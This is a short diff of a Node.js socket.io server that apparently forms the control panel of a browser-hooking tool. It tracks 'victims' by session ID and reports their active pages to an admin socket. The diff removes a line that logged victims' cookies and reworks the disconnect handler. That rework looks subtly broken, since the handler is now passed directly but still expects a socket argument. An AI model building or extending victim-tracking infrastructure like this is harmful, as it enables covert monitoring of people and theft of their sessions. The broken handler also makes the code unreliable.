@@ -29,11 +29,7 @@ module.exports.configure = function(io){
     })
 
     //when user disconnects, let admin know
-    socket.on('disconnect', function(){
-      disconnect(socket)
-      console.log(socket.handshake.headers.cookie)
-      console.log(`victim ${victimsBySessionId[socket.sessID].visibleId} disconnected`)
-    })
+    socket.on('disconnect', disconnect)
 
   })
 }
@@ -85,8 +81,9 @@ function processNewVictim(socket){
 
 function disconnect(socket){
   let victim = victimsBySessionId[socket.sessID]
-
-  //adminSocket.emit('victimDisconnect', socket.id)
-  delete victim.activePagesBySocketId[socket.id]
-  adminSocket.emit('updateVictim', victim)
+  if(victim) {
+    delete victim.activePagesBySocketId[socket.id]
+    adminSocket.emit('updateVictim', victim)
+    console.log(`victim ${victim.visibleId} disconnected`)
+  }
 }
